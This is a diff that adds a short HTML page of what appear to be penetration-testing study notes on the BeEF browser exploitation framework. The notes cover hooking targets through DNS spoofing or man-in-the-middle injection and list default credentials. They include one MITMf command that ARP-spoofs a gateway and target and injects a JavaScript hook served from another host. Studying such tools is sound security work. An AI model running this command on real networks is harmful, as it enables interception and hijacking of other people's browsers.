@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Beef</title>
+</head><body><b><span style="font-size: 12pt">Beef Framework:<br/>
+<br/>
+</span></b><span style="font-size: 12pt">-Browser Exploitation Framework allowing us to launch a number of attacks on a hooked target<br/>
+</span>-Targets are hooked once they load a hook url<br/>
+<br/>
+--&gt;DNS spoof requests to a page containing the hook<br/>
+--&gt;inject the hook in browsed pages(need to be MITM)<br/>
+<br/>
+user:beef<br/>
+password:beef123<br/>
+<br/>
+ex:<br/>
+#python mitmf.py --arp --spoof --gateway 10.0.2.1 --targets 10.0.2.15 -i eth0 --inject --js-url http://10.20.14.207:3000/hook.js<br/>
+<br/>
+</body></html>
